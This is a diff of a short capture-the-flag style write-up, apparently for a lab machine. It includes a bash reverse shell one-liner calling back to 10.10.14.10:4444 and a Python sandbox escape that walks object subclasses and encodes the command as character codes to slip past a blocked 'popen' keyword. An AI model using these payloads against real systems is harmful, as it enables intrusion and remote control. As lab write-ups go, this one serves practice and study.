@@ -6,12 +6,12 @@ Started: 5/8/25
 
 Pwned: 5/8/25
 
-## Nmap Output
+### Nmap Output
 ![nmap](./images/nmap.png)  
 
 popen was blocked  
 ![keywordblock](./images/keywordblocked.png)  
-
+'''
 RevShells basic format: bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'  
 
 x = ().__class__.__bases__[0].__subclasses__()
@@ -22,6 +22,7 @@ cmd = ''.join([chr(i) for i in [
     47,52,52,52,52,32,48,62,38,49
 ]])  # bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'
 e(['/bin/bash', '-c', cmd], shell=False) 
+'''
 
 RevShell/Foothold
 
